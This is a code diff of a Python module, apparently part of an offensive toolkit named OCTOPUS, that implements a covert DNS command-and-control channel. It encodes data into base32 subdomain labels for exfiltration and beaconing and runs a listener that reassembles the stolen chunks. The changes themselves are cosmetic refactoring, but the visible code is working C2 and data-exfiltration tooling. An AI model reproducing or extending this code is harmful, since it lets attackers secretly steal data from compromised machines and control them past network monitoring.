@@ -1,5 +1,5 @@
 """
-OCTOPUS v11 — DNS C2 Channel.
+DNS C2 channel.
 
 Provides covert command-and-control communication over DNS.
 Supports both DNS TXT record exfiltration and DNS subdomain beaconing.
@@ -15,7 +15,6 @@ Protocol:
   exfil:   <seq>.<b32_chunk>.<agent_id>.<domain>  →  A record ACK
 """
 
-import os
 import base64
 import hashlib
 import logging
@@ -23,7 +22,7 @@ import socket
 import struct
 import threading
 import time
-from typing import Dict, List, Optional, Tuple
+from typing import Optional
 
 logger = logging.getLogger("octopus.c2.channels.dns")
 
@@ -111,8 +110,8 @@ class DNSChannel:
         self.record_type: str = record_type
 
         # Listener state (server-side)
-        self._pending_tasks: Dict[str, List[dict]] = {}
-        self._received_data: Dict[str, Dict[int, bytes]] = {}
+        self._pending_tasks: dict[str, list[dict]] = {}
+        self._received_data: dict[str, dict[int, bytes]] = {}
         self._listener_running: bool = False
         self._listener_thread: Optional[threading.Thread] = None
         self._lock: threading.Lock = threading.Lock()
@@ -120,7 +119,7 @@ class DNSChannel:
         logger.info("DNS C2 channel initialized: domain=%s, record_type=%s",
                      self.domain, self.record_type)
 
-    def encode_data(self, data: bytes) -> List[str]:
+    def encode_data(self, data: bytes) -> list[str]:
         """Split data into DNS-safe labels (≤63 chars each).
 
         Encodes raw bytes using base32 and splits the result into
@@ -139,12 +138,12 @@ class DNSChannel:
             True
         """
         encoded = _b32_encode_safe(data)
-        labels: List[str] = []
+        labels: list[str] = []
         for i in range(0, len(encoded), _MAX_LABEL_LEN):
             labels.append(encoded[i:i + _MAX_LABEL_LEN])
         return labels
 
-    def decode_data(self, labels: List[str]) -> bytes:
+    def decode_data(self, labels: list[str]) -> bytes:
         """Reassemble data from DNS labels.
 
         Concatenates the labels and decodes the base32 payload back
@@ -188,7 +187,7 @@ class DNSChannel:
         safe_agent = agent_id.replace("-", "").lower()[:32]
 
         # Build query name: <data_labels>.<agent_id>.<domain>
-        parts = labels + [safe_agent, self.domain]
+        parts = [*labels, safe_agent, self.domain]
         query_name = ".".join(parts)
 
         # Validate total length
@@ -202,7 +201,7 @@ class DNSChannel:
             encoded = _b32_encode_safe(data)[:max_data_len]
             labels = [encoded[i:i + _MAX_LABEL_LEN]
                       for i in range(0, len(encoded), _MAX_LABEL_LEN)]
-            parts = labels + [safe_agent, self.domain]
+            parts = [*labels, safe_agent, self.domain]
             query_name = ".".join(parts)
 
         try:
@@ -307,7 +306,7 @@ class DNSChannel:
             seq_label = f"{seq:04x}"
             total_label = f"{total_chunks:04x}"
 
-            parts = [seq_label, total_label] + labels + ["exfil", self.domain]
+            parts = [seq_label, total_label, *labels, "exfil", self.domain]
             query_name = ".".join(parts)
 
             # Truncate if needed
@@ -424,7 +423,7 @@ class DNSChannel:
 
                 try:
                     query_name, qtype = _parse_dns_query(data)
-                except Exception as e:
+                except Exception:
                     continue
 
                 if not query_name.endswith(self.domain):
@@ -450,11 +449,11 @@ class DNSChannel:
 
     def _handle_query(
         self,
-        labels: List[str],
+        labels: list[str],
         query_name: str,
         qtype: int,
         raw_query: bytes,
-        addr: Tuple[str, int],
+        addr: tuple[str, int],
     ) -> Optional[bytes]:
         """Process an incoming DNS query and generate a response.
 
@@ -478,7 +477,6 @@ class DNSChannel:
         if labels[-1] == "exfil" and len(labels) >= 3:
             try:
                 seq = int(labels[0], 16)
-                # total = int(labels[1], 16)  # Available for reassembly validation
                 data_labels = labels[2:-1]
                 chunk_data = self.decode_data(data_labels)
 
@@ -530,7 +528,7 @@ class DNSChannel:
 # ─── DNS Wire Format Helpers ────────────────────────────────────
 
 
-def _dns_query_txt(name: str) -> List[str]:
+def _dns_query_txt(name: str) -> list[str]:
     """Perform a DNS TXT query using the system resolver.
 
     Args:
@@ -580,7 +578,7 @@ def _dns_query_a(name: str) -> Optional[str]:
     return None
 
 
-def _parse_dns_query(data: bytes) -> Tuple[str, int]:
+def _parse_dns_query(data: bytes) -> tuple[str, int]:
     """Parse a raw DNS query packet to extract the query name and type.
 
     Args:
@@ -597,7 +595,7 @@ def _parse_dns_query(data: bytes) -> Tuple[str, int]:
 
     # Skip header (12 bytes), parse question section
     offset = _DNS_HEADER_LEN
-    labels: List[str] = []
+    labels: list[str] = []
 
     while offset < len(data):
         length = data[offset]
